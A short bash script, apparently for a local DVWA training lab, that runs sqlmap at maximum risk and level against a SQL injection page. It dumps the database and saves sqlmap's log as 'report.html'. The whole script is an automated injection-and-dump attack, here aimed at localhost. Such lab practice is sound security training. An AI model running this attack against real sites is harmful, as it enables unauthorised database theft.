#!/bin/bash
echo "[*] Gerando relatório HTML..."
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --data="id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=123" \
  --batch --risk=3 --level=5 --dump \
  --output-dir=output-sqlmap
cat output-sqlmap/*/log > report.html
echo "[✓] Relatório gerado em report.html"
